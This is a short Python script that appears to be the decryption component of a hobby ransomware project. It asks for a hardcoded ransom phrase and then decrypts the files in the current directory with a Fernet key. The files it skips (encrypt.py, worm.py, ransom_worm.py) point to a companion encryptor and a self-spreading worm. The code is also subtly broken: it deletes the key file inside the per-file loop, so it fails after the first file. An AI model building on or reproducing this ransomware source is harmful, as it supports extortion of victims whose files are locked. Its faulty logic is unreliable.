#!/usr/bin/env python3 
import os
from cryptography.fernet import Fernet 

files = [] 

for file in os.listdir():
    if file == "encrypt.py" or file =="secret_key.key" or file == "decrypt.py" or file =="worm.py" or file=="ransom_worm.py":
        continue
    if os.path.isfile(file):
        files.append(file)
    


with open("secret_key.key", "rb") as key:
    secret = key.read()

secretphrase = "free"
user_phrase = input('Enter the secret phrase to decrypt your files\n')

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        decrypted_contents = Fernet(secret).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(decrypted_contents)
        print("Correct! Your files are now decrypted!")
        os.remove("secret_key.key")  #removes secret key after decryption
else: 
    print("Sorry, wrong secret phrase!")
